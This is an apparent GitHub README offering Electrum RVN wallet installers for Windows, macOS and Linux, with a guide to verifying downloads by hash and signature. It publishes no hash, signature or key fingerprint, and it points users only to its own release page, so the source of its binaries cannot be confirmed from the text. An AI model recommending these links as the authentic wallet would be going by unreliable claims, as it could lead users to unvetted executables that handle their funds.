![Electrum RVN](assets/banner-article.png)

# How to Verify an Electrum RVN Download

<!-- compact-download-block -->

<p align="center">Comparing a checksum before you run the file</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Download from the releases page, then check the file against the published hash and signature before you run it. Verification is two minutes of work that turns "I hope this is the right file" into a fact. A wallet that arrives through an advertisement or a search result is not the wallet until it passes.

## Why bother

A wallet installer is the perfect target for substitution: it is downloaded once, run with your trust, and immediately handles keys. A modified build can look identical, behave normally, and send your seed somewhere the moment you create a wallet.

Signatures exist because of that. The published key signs the published file; if the file you have does not verify, it is not the file the publisher signed - and no amount of familiar branding changes that.

## What you need

Three things from the same release page: the file, its published hash, and the signature or the public key used to make it. The releases page is the only source for all three: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

If the page offers a checksum list, a `.sig` file and a key fingerprint, that is the complete set. If it offers only a hash, you can still catch a corrupted or swapped download, though you are trusting the page's own copy of the hash - which is why signature verification is the stronger check.

## The hash check

1. Download the file and note its name.
2. Compute the hash locally: on Windows `certutil -hashfile <file> SHA256`, on macOS `shasum -a 256 <file>`, on Linux `sha256sum <file>`.
3. Compare, character by character, with the value published for that exact filename. A single differing character means the file is not the one described.
4. If it does not match, delete the file. Do not run it and do not "try again later" with the same download.

Hashes catch corrupted downloads, truncated transfers and files swapped on a mirror. They do not catch a page that was itself altered, because such a page would publish a matching hash for its own file. That is the gap signatures close.

## The signature check

Signature verification needs the publisher's public key, obtained from a source independent of the download page - the project's repository, or a fingerprint quoted in more than one place. Then:

1. Import the key and check its fingerprint against the one you obtained elsewhere.
2. Verify the signature file against the downloaded file with your GPG tool of choice.
3. A good signature from the expected key means the file is the one that key holder signed.

If the signature verifies but the key fingerprint is not the one you expected, stop: you have verified a file against the wrong identity, which is worse than not checking, because it feels like success.

## Reproducible builds, in one paragraph

The site describes its builds as signed and reproducible. Reproducibility means someone can build from the published source and get a byte-identical binary to the published one. When that holds, the source you can read and the binary you run are the same program - the strongest check available, and the reason open source is meaningful for a wallet. [Free and open source Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/free-and-open-source-electrum-rvn.md) covers the licence side.

## The paths that skip verification

None of these is a shortcut; each is a way to lose a seed.

- **An advertisement** for "Electrum RVN download". Ads are bought by whoever pays, and lookalike domains are cheap.
- **A search result** that is not the canonical site. Check the domain, not the title.
- **A file sent by a person** in chat or email, "because the site was down".
- **A mirror** or a file host, however fast it is.
- **A browser extension** claiming to be the wallet. There is no browser build; [why Electrum RVN is desktop only](https://github.com/electrum-source/download-and-setup/blob/main/why-electrum-rvn-is-desktop-only.md).

## After it passes

Install it, create a wallet, and write the seed down before the first coin arrives - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md). Verification protects the program; the seed protects the funds if the program is later lost with the machine.

Keep the downloaded installer until the next release works for you. It is the only copy you have verified, and re-downloading a version that has left the page is harder than keeping a file.

## What verification does not cover

It does not tell you the code is free of bugs. It does not audit the project - [Electrum RVN security audit](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-security-audit.md) explains why that claim is worded as it is. And it does not protect you from a compromised machine that alters files after installation.

It does one thing well: it tells you that the binary you are about to run is the one the publisher signed. For a wallet, that is worth the two minutes.

The wallet is actively maintained, and each release is published with its files on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) is the next thing to know, and [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) is what to rehearse before you need it.

## FAQ

### Do I have to verify every download?

Strictly, yes: each file is a new artefact. In practice, verify the first install, any update where the page or filename looks different, and anything you did not download yourself.

### What if the hash does not match?

Delete the file and download again from the releases page. If it still does not match, stop and treat the source as suspect rather than trying another mirror.

### Can I skip the signature if the hash matches?

The hash catches corruption; the signature catches substitution. Skipping it means trusting the page that published the hash, which is exactly the page an attacker would control.

### Where do I get the public key?

From a source independent of the download page - the project's repository, or a fingerprint you have seen in more than one place. A key published only on the page you are checking proves nothing.

### Is a signed build the same as an audited one?

No. A signature says who published the file; an audit is a review of code at a point in time. Neither substitutes for the other.

<!-- related-articles -->

## Related articles

- [Is Electrum RVN Free and Open Source?](https://github.com/electrum-source/download-and-setup/blob/main/free-and-open-source-electrum-rvn.md)
- [Why Electrum RVN Is Desktop Only](https://github.com/electrum-source/download-and-setup/blob/main/why-electrum-rvn-is-desktop-only.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Electrum RVN Security and Audit Status](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-security-audit.md)
